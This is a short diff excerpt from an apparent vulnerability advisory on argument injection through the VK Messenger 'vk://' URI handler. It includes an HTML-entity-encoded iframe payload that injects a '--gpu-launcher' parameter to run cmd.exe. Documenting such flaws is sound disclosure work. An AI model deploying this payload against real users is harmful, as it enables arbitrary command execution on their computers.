@@ -26,6 +26,7 @@ The VK Messenger, which is part of the VK package, registers a uri handler on Wi
 
 When the browser processes the `vk://` uri handler it is possible to inject arbitrary command line parameters for vk.exe, since the application does not properly parse them. It is possible to inject the ‘–gpu-launcher=’ parameter to execute arbitrary commands. It is also possible to inject the ‘–browser-subprocess-path=’ parameter to execute arbitrary commands. Network share paths are allowed, too.<br>
 Example of attack encoded in HTML entity:
+
 `<iframe src='vk:?"&#32;&#45;&#45;&#103;&#112;&#117;&#45;&#108;&#97;&#117;&#110;&#99;&#104;&#101;&#114;&#61;&#34;&#99;&#109;&#100;&#46;&#101;&#120;&#101;&#32;&#47;&#99;&#32;&#115;&#116;&#97;&#114;&#116;&#32;&#99;&#97;&#108;&#99;&#34;&#32;&#45;&#45;'></iframe>`
 
 When opening a malicious page, a notification box asks the user to open VK.
